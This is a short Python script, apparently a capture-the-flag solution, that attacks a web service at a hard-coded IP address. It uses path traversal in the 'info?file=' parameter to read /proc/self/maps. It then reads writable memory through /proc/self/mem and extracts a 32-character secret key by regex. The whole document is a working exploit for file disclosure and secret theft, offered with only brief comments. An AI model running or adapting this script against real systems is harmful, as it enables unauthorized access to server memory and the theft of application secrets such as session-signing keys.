import requests
import re

url='http://61.147.171.105:63081/'
s_key=''
map_list=requests.get(url+'info?file=../../proc/self/maps')

map_list=map_list.text.split('\\n') #根据字符串"\n"进行分割
for i in map_list:
    map_addr=re.match(r"([a-z0-9]+)-([a-z0-9]+) rw",i) #正则匹配rw可读可写内存区域，（）起到分组的作用
    if map_addr:
        start=int(map_addr.group(1),16)
        end=int(map_addr.group(2),16)
        print("found rw addr:",start,"-",end)

        res=requests.get(f"{url}info?file=../../proc/self/mem&start={start}&end={end}")
        if "*abcdefgh" in res.text:
            s_key_=re.findall("[a-z0-9]{32}\*abcdefgh",res.text)
            if s_key_:
                print("find secret_key:",s_key_[0])
                s_key=s_key_[0]
                break



